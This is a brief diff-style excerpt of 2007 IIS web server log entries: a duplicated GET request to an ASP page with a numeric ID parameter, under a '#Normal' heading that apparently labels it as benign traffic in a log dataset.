+2007-10-08 19:50:38 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId=2276 200 456 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+#Normal ##########################################################################################
+
+2007-10-08 19:50:38 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId=2276 200 456 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
